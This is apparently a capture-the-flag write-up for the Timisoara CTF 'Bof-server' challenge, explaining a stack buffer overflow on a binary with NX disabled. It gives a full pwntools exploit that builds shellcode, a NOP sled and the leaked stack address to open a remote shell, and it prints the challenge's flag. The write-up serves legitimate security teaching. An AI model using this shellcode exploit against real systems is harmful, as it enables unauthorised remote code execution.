---
title: "Bof-server [100]"
tags: [Timisoara CTF, Binary Exploitation]
excerpt: "Binary Exploitation"
--- 

**Category:** Binary Exploitation 

> Today kids we learn how to write exploits for super-secure software: bof-server!  
nc 89.38.208.144 11112  
(non-standard flag format)

## Write-up
This is a standard buffer overflow shellcoding challenge. 

As usual, running `checksec` on the binary gives:
```   
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)    
   RWX:      Has RWX segments
```

`checksec` shows the `NX Bit` as disabled, which means shellcode can be executed. After running the binary, we see the following output:  

`Hello! Here is the stack address: 7fffffffdc60, enter your name please:`  

The binary prints out the starting address of the stack, and asks for input. We can use `pwntools` to generate the shellcode to execute shell. The payload contains the following:

1. Shellcode
2. Padding (Overflow the stack until RIP)    
3. Stack address (To jump to our shellcode and execute shell)

Here's the final exploit:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./bof-server",
    #"libc" : "./",
    #"ld" : "./",
    "HOST" : "89.38.208.144",
    "PORT" : 11112,
}

def exploit(p):
    padding = "\x90"*264
    shellcode = asm(shellcraft.sh())

    ru("stack address: " )
    address = int("0x" + r(12), 16)

    payload = "\x90"*50 
    payload += shellcode
    payload += "\x90"*(264-50-len(shellcode))
    payload += p64(address)
    sla("please: ", payload)
    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

**Flag:** TIMCTF{oooverfl0w}wwwWWW